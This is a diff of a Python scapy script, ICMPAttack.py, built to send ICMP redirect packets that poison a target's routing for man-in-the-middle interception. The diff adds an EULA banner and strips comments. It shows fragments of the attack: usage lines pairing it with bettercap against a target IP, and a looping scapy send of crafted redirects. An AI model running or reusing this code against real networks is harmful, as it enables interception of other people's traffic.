@@ -1,10 +1,26 @@
+# *************************************************************************************** #
+# ---------------------------------- EULA NOTICE ---------------------------------------- #
+#                     Agreement between "Haroon Awan" and "You"(user).                    #
+# ---------------------------------- EULA NOTICE ---------------------------------------- #
+#  1. By using this piece of software your bound to these point.                          #
+#  2. This an End User License Agreement (EULA) is a legal between a software application #
+#     author "Haroon Awan" and (YOU) user of this software.                               #
+#  3. This software application grants users rights to use for any purpose or modify and  #
+#     redistribute creative works.                                                        #
+#  4. This software comes in "is-as" warranty, author "Haroon Awan" take no responsbility #
+#     what you do with by/this software as your free to use this software.                #
+#  5. Any other purpose(s) that it suites as long as it is not related to any kind of     #
+#     crime or using it in un-authorized environment.                                     #
+#  6. You can use this software to protect and secure your data information in any        #
+#     environment.                                                                        #
+#  7. It can also be used in state of being protection against the unauthorized use of    #
+#     information.                                                                        #
+#  8. It can be used to take measures achieve protection.                                 #
+# *************************************************************************************** #
+
+
 #!/usr/bin/env python
 
-##############################################################################
-# ICMPAttack.py - script to perform ICMP redirect attacks                  #
-##############################################################################
-
-# Suppress scapy complaints
 import logging
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 from scapy.all import *
@@ -12,9 +28,6 @@ from getopt import getopt
 from getopt import GetoptError
 import sys
 
-##############################################################################
-# Display help message                                                       #
-##############################################################################
 def doHelp():
 
 
@@ -49,9 +62,6 @@ Blind  : ICMPAttack.py -v -i wlan0 -g 192.168.15.0 -t 192.168.15.18 && bettercap
 """)
 
 
-##############################################################################
-# Verbose                                                                    #
-##############################################################################
 def log(verbose, gw, target, iface):
    if( not verbose ):
       return
@@ -83,19 +93,6 @@ def log(verbose, gw, target, iface):
 >>> send(ip/icmp/ip2/UDP(), loop=1, inter=2)
 """
 
-##############################################################################
-# Check that packet forwarding is activated at kernel level                  #
-##############################################################################
-#def isForwarding():
-#   forwarding = open('/proc/sys/net/ipv4/ip_forward').read(1);
-#   if( 0 == int(forwarding) ):
-#      print '-E- Forwarding deactivated. Please enable it: sudo sysctl -w net.ipv4.ip_forward=1'
-#      sys.exit(-1);
-
-
-##############################################################################
-# Parse command line arguments                                               #
-##############################################################################
 def parseArgs():
    verbose = False;
    iface = conf.iface;
@@ -130,10 +127,7 @@ def parseArgs():
 
    return verbose, iface, target, gw, interval
 
-##############################################################################
-# Main - check command line arguments and if redirect is enable at kernel    #
-# level and perform continuous poisonning until user Ctrl^C the script       #
-##############################################################################
+
 if( '__main__' == __name__ ):
    conf.verb=0;
 
